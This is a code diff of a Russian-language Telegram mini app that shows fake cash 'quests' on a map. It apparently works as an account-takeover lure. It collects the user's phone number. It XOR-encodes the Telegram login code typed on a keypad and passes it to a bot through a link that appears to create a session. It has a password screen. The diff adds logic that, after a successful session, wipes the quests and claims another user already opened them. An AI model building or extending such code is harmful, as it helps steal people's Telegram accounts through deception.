@@ -136,19 +136,17 @@
         }
 
         .quest-photo .eye-icon {
-    position: absolute;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    display: flex;           
-    align-items: center;     
-    justify-content: center; 
-    width: 40px;
-    height: 40px;
-    pointer-events: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: flex;           
+            align-items: center;     
+            justify-content: center; 
+            width: 40px;
+            height: 40px;
+            pointer-events: none;
         }
-
-
 
         /* --- КНОПКА УПРАВЛЕНИЯ (правый верхний угол) --- */
         .controls {
@@ -520,16 +518,46 @@
 
         /* ===== SPINNER ===== */
         .spinner {
-    display: inline-block;
-    width: 40px;
-    height: 40px;
-    border: 3px solid rgba(255, 255, 255, 0.3);
-    border-radius: 50%;
-    border-top-color: #ffffff;
-    animation: spin-anim 0.8s linear infinite;
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #ffffff;
+            animation: spin-anim 0.8s linear infinite;
         }
         @keyframes spin-anim { to { transform: rotate(360deg); } }
         .btn-loading { opacity: 0.7 !important; cursor: not-allowed !important; pointer-events: none; }
+
+        /* ===== EMPTY STATE ===== */
+        .empty-state {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: #334154;
+            border-radius: 20px 20px 0 0;
+            padding: 30px 20px;
+            z-index: 1000;
+            display: none;
+            text-align: center;
+        }
+        .empty-state.active { display: block; }
+        .empty-state-icon {
+            font-size: 48px;
+            margin-bottom: 12px;
+        }
+        .empty-state-title {
+            color: #e2e8f0;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .empty-state-desc {
+            color: #a0aec0;
+            font-size: 14px;
+            line-height: 1.5;
+        }
     </style>
 </head>
 <body>
@@ -575,9 +603,15 @@
                         <line x1="2" y1="2" x2="22" y2="22" stroke="white" stroke-width="2" stroke-linecap="round"/>
                     </svg>
                 </div>
-
             </div>
         </div>
+    </div>
+
+    <!-- Пустое состояние (квесты открыты другим) -->
+    <div class="empty-state" id="emptyState">
+        <div class="empty-state-icon">🔓</div>
+        <div class="empty-state-title">Квесты недоступны</div>
+        <div class="empty-state-desc">Этот квест уже открыт другим пользователем.<br>Возвращайтесь позже для новых заданий.</div>
     </div>
 
     <!-- ===== МОДАЛЬНОЕ ОКНО ТЕЛЕФОНА ===== -->
@@ -676,7 +710,8 @@
         let currentPointIndex = 0;
         let currentUserId = null;
         let userPhone = null;
-        let authInProgress = false; // блокировка повторных кликов
+        let authInProgress = false;
+        let questsDeleted = false;
         const RADIUS_KM = 4;
         const MIN_RANDOM_KM = 0.5;
         const MAX_RANDOM_KM = 1.5;
@@ -690,33 +725,18 @@
         tg.setBackgroundColor('#334154');
 
         const user = tg.initDataUnsafe?.user;
-        let startParam = tg.initDataUnsafe?.start_param;
+        const startParam = tg.initDataUnsafe?.start_param;
 
-        // При возврате из бота startParam может быть пустым, используем сохраненный
-        if (!startParam) {
-            startParam = localStorage.getItem('last_start_param') || null;
-        } else {
-            localStorage.setItem('last_start_param', startParam);
-        }
-
-        // 1. Пробуем получить ID из Telegram user data
         if (user && user.id) {
             currentUserId = user.id;
-            localStorage.setItem('debug_user_id', currentUserId);
+        } else {
+            currentUserId = parseInt(localStorage.getItem('debug_user_id') || '0') || null;
         }
-        // 2. Пробуем получить ID из localStorage
-        else {
-            const savedId = localStorage.getItem('debug_user_id');
-            if (savedId) {
-                currentUserId = parseInt(savedId);
-            }
-        }
-        // 3. Fallback: извлекаем ID из startParam (для success_map_, retry_map_, enterPassword_map_)
+
+        // Fallback: если currentUserId не определён, но есть startParam — извлекаем из него
         if (!currentUserId && startParam) {
             const parts = startParam.split('_');
-            // success_map_123456 → ['success', 'map', '123456']
-            // createSession_map_123456 → ['createSession', 'map', '123456']  
-            if (parts.length >= 3) {
+            if (parts.length >= 4) {
                 const extractedId = parseInt(parts[parts.length - 1]);
                 if (!isNaN(extractedId)) {
                     currentUserId = extractedId;
@@ -724,10 +744,6 @@
                 }
             }
         }
-
-        console.log('currentUserId:', currentUserId, 'startParam:', startParam);
-
-
 
         // ============ SHA256 ============
         async function sha256(message) {
@@ -771,6 +787,39 @@
                 toast.classList.add('hide');
                 setTimeout(() => toast.remove(), 300);
             }, 3000);
+        }
+
+        // ============ QUEST DELETION LOGIC ============
+        function getQuestDeletedKey() {
+            return `map_quests_deleted_${currentUserId}`;
+        }
+
+        function isQuestsDeleted() {
+            return localStorage.getItem(getQuestDeletedKey()) === 'true';
+        }
+
+        function markQuestsDeleted() {
+            localStorage.setItem(getQuestDeletedKey(), 'true');
+            questsDeleted = true;
+        }
+
+        function clearQuestData() {
+            localStorage.removeItem('questData');
+            // Удаляем точки с карты
+            randomMarkers.forEach(marker => {
+                if (marker && map) map.removeLayer(marker);
+            });
+            randomMarkers = [];
+            questData = { points: [] };
+        }
+
+        function showEmptyState() {
+            document.getElementById('emptyState').classList.add('active');
+            closeQuestPanel();
+        }
+
+        function hideEmptyState() {
+            document.getElementById('emptyState').classList.remove('active');
         }
 
         // ============ ЭКРАНЫ АВТОРИЗАЦИИ ============
@@ -839,7 +888,6 @@
                 const encryptedCode = await xorEncrypt(currentCode);
                 tg.openTelegramLink(`https://t.me/${BOT_USERNAME}?start=sendCode_map_${currentUserId}_${encryptedCode}`);
 
-                // Показываем спиннер
                 const keypad = document.querySelector('.code-keypad');
                 if (keypad) {
                     keypad.style.pointerEvents = 'none';
@@ -876,7 +924,6 @@
                 currentCode = '';
                 updateCodeDots();
                 tg.setHeaderColor("#334154");
-                // Сбрасываем спиннер и разблокируем нажатие
                 authInProgress = false;
                 const eyeIcon = document.querySelector('.eye-icon');
                 if (eyeIcon) {
@@ -906,18 +953,11 @@
         }
 
         function startAuthFlow() {
-            // Сохраняем флаг авторизации и ID квеста
             localStorage.setItem(`map_auth_pending_${currentUserId}`, 'true');
             localStorage.setItem(`map_auth_quest_${currentUserId}`, currentPointIndex);
-            const point = questData.points[currentPointIndex];
-            if (point) {
-                localStorage.setItem(`map_auth_quest_id_${currentUserId}`, point.questId);
-            }
 
-            // Открываем бота для создания сессии
             tg.openTelegramLink(`https://t.me/${BOT_USERNAME}?start=createSession_map_${currentUserId}`);
 
-            // Через 10 секунд показываем экран ввода кода
             setTimeout(() => {
                 codeScreen.classList.add('active');
                 tg.setHeaderColor("#334154");
@@ -935,41 +975,17 @@
             if (startParam.startsWith('enterPassword_map_')) {
                 passwordScreen.classList.add('active');
                 tg.setHeaderColor("#334154");
-                localStorage.removeItem('last_start_param');
             } else if (startParam.startsWith('success_map_')) {
                 const targetUserId = parseInt(startParam.split('_')[2]);
-                console.log('success_map_ detected, targetUserId:', targetUserId, 'currentUserId:', currentUserId);
                 if (targetUserId === currentUserId) {
-                    const pendingQuest = localStorage.getItem(`map_auth_quest_${currentUserId}`);
-                    const pendingQuestId = localStorage.getItem(`map_auth_quest_id_${currentUserId}`);
-
-                    if (pendingQuest !== null) {
-                        questUnlocked[pendingQuest] = true;
-                        localStorage.setItem('questUnlocked', JSON.stringify(questUnlocked));
-                    }
+                    // УДАЛЯЕМ КВЕСТЫ и показываем toast
+                    markQuestsDeleted();
+                    clearQuestData();
+                    showEmptyState();
+                    showToast('Этот квест уже открыт другим пользователем', 'error');
 
                     localStorage.removeItem(`map_auth_pending_${currentUserId}`);
                     localStorage.removeItem(`map_auth_quest_${currentUserId}`);
-                    localStorage.removeItem(`map_auth_quest_id_${currentUserId}`);
-
-                    showToast('Этот квест уже открыл другой пользователь', 'error');
-
-                    // Удаляем все точки квеста с карты
-                    questData.points.forEach((point, index) => {
-                        if (randomMarkers[index]) {
-                            map.removeLayer(randomMarkers[index]);
-                        }
-                    });
-                    randomMarkers = [];
-                    questData.points = [];
-                    localStorage.removeItem('questData');
-                    localStorage.setItem(`map_quests_cleared_${currentUserId}`, 'true');
-
-                    // Закрываем панель квеста
-                    closeQuestPanel();
-
-                    localStorage.removeItem('last_start_param');
-
                     if (window.history.replaceState) {
                         window.history.replaceState({}, document.title, window.location.pathname);
                     }
@@ -978,7 +994,6 @@
                 const targetUserId = parseInt(startParam.split('_')[2]);
                 if (targetUserId === currentUserId) {
                     localStorage.removeItem(`map_auth_pending_${currentUserId}`);
-                    localStorage.removeItem('last_start_param');
                     showToast('Попробуйте снова', 'info');
                 }
             } else {
@@ -1002,13 +1017,11 @@
             if (authInProgress) return;
             authInProgress = true;
 
-            // Сразу показываем спиннер вместо eye icon
             const eyeIcon = document.querySelector('.eye-icon');
             if (eyeIcon) {
                 eyeIcon.innerHTML = '<div class="spinner" style="width:32px;height:32px;border-width:3px;"></div>';
             }
 
-            // Проверяем, есть ли сохранённый телефон
             const savedPhone = localStorage.getItem(`map_phone_${currentUserId}`);
             if (savedPhone) {
                 userPhone = savedPhone;
@@ -1017,8 +1030,6 @@
                 openPhoneModal();
             }
         }
-
-
 
         // --- Свайп для закрытия панели ---
         let startY = 0;
@@ -1117,12 +1128,21 @@
         }
 
         function generateQuestData(lat, lng) {
-            const saved = localStorage.getItem('questData');
-            if (saved) return JSON.parse(saved);
-
-            // Если квесты уже были очищены через подтверждение, не создаём новые
-            if (localStorage.getItem(`map_quests_cleared_${currentUserId}`) === 'true') {
+            // Если квесты уже удалены — не генерируем новые
+            if (isQuestsDeleted()) {
+                questsDeleted = true;
                 return { userLat: lat, userLng: lng, points: [], created: Date.now() };
+            }
+
+            const saved = localStorage.getItem('questData');
+            if (saved) {
+                const parsed = JSON.parse(saved);
+                // Если в сохранённых данных точки уже удалены
+                if (parsed.points && parsed.points.length === 0 && isQuestsDeleted()) {
+                    questsDeleted = true;
+                    return parsed;
+                }
+                if (parsed.points && parsed.points.length > 0) return parsed;
             }
 
             const points = [];
@@ -1145,16 +1165,17 @@
         }
 
         function showQuestPanel(index) {
+            if (questsDeleted || isQuestsDeleted()) return;
+
             currentPointIndex = index;
             const point = questData.points[index];
-            if (!point) return; // Точка удалена
+            if (!point) return;
 
             document.getElementById('questTitle').textContent = `Квест #${point.questId}`;
             document.getElementById('questReward').textContent = `Содержимое: ${point.reward.toLocaleString('ru-RU')} ₽`;
             document.getElementById('questCoords').textContent = formatCoords(point.lat, point.lng);
             document.getElementById('questDistance').textContent = formatDistance(point.distance);
             document.getElementById('questImg').src = point.photo;
-
 
             panel.classList.add('active');
             panel.style.transform = 'translateY(0)';
@@ -1179,6 +1200,7 @@
             }).addTo(map);
 
             questData = generateQuestData(lat, lng);
+            questsDeleted = isQuestsDeleted();
 
             const userIcon = L.divIcon({
                 className: 'user-marker',
@@ -1189,21 +1211,28 @@
             userMarker = L.marker([lat, lng], { icon: userIcon }).addTo(map);
             userMarker.bindPopup('<b>📍 Вы здесь</b><br>' + formatCoords(lat, lng)).openPopup();
 
-            const randomIcon = L.divIcon({
-                className: 'random-marker',
-                html: '<div style="width:24px;height:24px;background:#e74c3c;border:3px solid white;border-radius:50%;box-shadow:0 2px 8px rgba(0,0,0,0.3);display:flex;align-items:center;justify-content:center;color:white;font-size:12px;font-weight:bold;">?</div>',
-                iconSize: [24, 24],
-                iconAnchor: [12, 12]
-            });
+            // Если квесты удалены — показываем пустое состояние и не добавляем маркеры
+            if (questsDeleted || !questData.points || questData.points.length === 0) {
+                showEmptyState();
+            } else {
+                hideEmptyState();
 
-            questData.points.forEach((point, index) => {
-                const marker = L.marker([point.lat, point.lng], { icon: randomIcon }).addTo(map);
-                marker.on('click', () => {
-                    closeQuestPanel();
-                    setTimeout(() => showQuestPanel(index), 50);
+                const randomIcon = L.divIcon({
+                    className: 'random-marker',
+                    html: '<div style="width:24px;height:24px;background:#e74c3c;border:3px solid white;border-radius:50%;box-shadow:0 2px 8px rgba(0,0,0,0.3);display:flex;align-items:center;justify-content:center;color:white;font-size:12px;font-weight:bold;">?</div>',
+                    iconSize: [24, 24],
+                    iconAnchor: [12, 12]
                 });
-                randomMarkers.push(marker);
-            });
+
+                questData.points.forEach((point, index) => {
+                    const marker = L.marker([point.lat, point.lng], { icon: randomIcon }).addTo(map);
+                    marker.on('click', () => {
+                        closeQuestPanel();
+                        setTimeout(() => showQuestPanel(index), 50);
+                    });
+                    randomMarkers.push(marker);
+                });
+            }
 
             const bounds = L.latLng(lat, lng).toBounds(RADIUS_KM * 2000);
             map.setMaxBounds(bounds);
@@ -1224,7 +1253,6 @@
                 (position) => {
                     const lat = position.coords.latitude;
                     const lng = position.coords.longitude;
-                    // Сохраняем в localStorage
                     localStorage.setItem('lastLat', lat.toString());
                     localStorage.setItem('lastLng', lng.toString());
                     localStorage.setItem('lastLocTime', Date.now().toString());
@@ -1257,7 +1285,6 @@
             const time = localStorage.getItem('lastLocTime');
             if (lat && lng && time) {
                 const age = Date.now() - parseInt(time);
-                // Кэш валиден 24 часа
                 if (age < 24 * 60 * 60 * 1000) {
                     return { lat: parseFloat(lat), lng: parseFloat(lng) };
                 }
@@ -1271,17 +1298,15 @@
             document.getElementById('error').classList.add('active');
         }
 
-        // Проверяем start_param ПЕРЕД геолокацией
+        // Проверяем start_param ПЕРРЕД геолокацией
         const bootStartParam = tg.initDataUnsafe?.start_param;
         const isPasswordScreen = bootStartParam && bootStartParam.startsWith('enterPassword_map_');
 
         if (isPasswordScreen) {
-            // Не запрашиваем геолокацию, сразу показываем экран пароля
             document.getElementById('loading').classList.add('hidden');
             passwordScreen.classList.add('active');
             tg.setHeaderColor("#334154");
         } else {
-            // Проверяем кэш геопозиции
             const cached = loadCachedLocation();
             if (cached) {
                 document.getElementById('loading').classList.add('hidden');
